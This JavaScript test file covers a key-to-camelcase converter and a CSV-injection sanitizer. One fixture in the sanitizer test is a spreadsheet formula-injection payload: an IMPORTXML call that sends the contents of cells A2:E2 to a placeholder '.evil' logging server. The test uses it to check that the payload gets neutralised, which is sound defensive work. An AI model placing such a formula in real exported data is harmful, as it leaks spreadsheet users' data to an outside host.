import { expect } from 'chai';
import toCamelcase from './to-camelcase';
import sanitizeCSVInjection from './sanitize-csv-injection';

const testDate = Date.now();
describe('to camelcase', () => {
  it('Object: should convert object keys to camelcase', () => {
    const rawData = {
      best_chili: {
        chili_ingredients: [
          'beef',
          'dried chilis',
          'fresh tomatoes',
          'cumin',
          'onions',
          'onion-powder',
          'peppers',
        ],
        chili_steps: {
          step_1: '',
          step_2: '',
        },
      },
      serves: 6,
      pairs_with: [
        {
          'french-bread': {},
        },
        {
          'rye-croutons': {},
        },
      ],
      created_at: testDate,
    };

    const expectedData = {
      bestChili: {
        chiliIngredients: [
          'beef',
          'dried chilis',
          'fresh tomatoes',
          'cumin',
          'onions',
          'onion-powder',
          'peppers',
        ],
        chiliSteps: { step_1: '', step_2: '' },
      },
      serves: 6,
      pairsWith: [{ frenchBread: {} }, { ryeCroutons: {} }],
      createdAt: testDate,
    };

    const output = toCamelcase(rawData);

    expect(output).to.deep.equals(expectedData);
  });

  it('Array: should convert object keys to camelcase', () => {
    const rawData = [
      {
        best_chili: {
          chili_ingredients: [
            'beef',
            'dried chilis',
            'fresh tomatoes',
            'cumin',
            'onions',
            'onion-powder',
            'peppers',
          ],
          chili_steps: {
            step_1: '',
            step_2: '',
          },
        },
        serves: 6,
        pairs_with: [
          {
            'french-bread': {},
          },
          {
            'rye-croutons': {},
          },
        ],
      },
      {
        'french-bread': 1,
      },
    ];

    const expectedData = [
      {
        bestChili: {
          chiliIngredients: [
            'beef',
            'dried chilis',
            'fresh tomatoes',
            'cumin',
            'onions',
            'onion-powder',
            'peppers',
          ],
          chiliSteps: { step_1: '', step_2: '' },
        },
        serves: 6,
        pairsWith: [{ frenchBread: {} }, { ryeCroutons: {} }],
      },
      {
        frenchBread: 1,
      },
    ];

    const output = toCamelcase(rawData);

    expect(output).to.deep.equals(expectedData);
  });
});

describe('sanitizeCSVInjection', () => {
  it('should add tab character at the beginning of =,+,-,@', () => {
    const input = [
      '=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")',
      ['+Arts, Culture & Science', 'Armed Forces & Emergency Services'],
      [
        {
          lat: '50.675737',
          long: '-3.037751',
          city: '@London',
        },
      ],
      {
        twitter: 'https://www.twitter.com',
      },
      false,
      null,
      undefined,
      true,
    ];

    const expected = [
      '\t=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")',
      ['\t+Arts, Culture & Science', 'Armed Forces & Emergency Services'],
      [
        {
          lat: '50.675737',
          long: '\t-3.037751',
          city: '\t@London',
        },
      ],
      {
        twitter: 'https://www.twitter.com',
      },
      false,
      null,
      undefined,
      true,
    ];

    const output = sanitizeCSVInjection(input);
    expect(output).to.deep.equals(expected);
  });
});
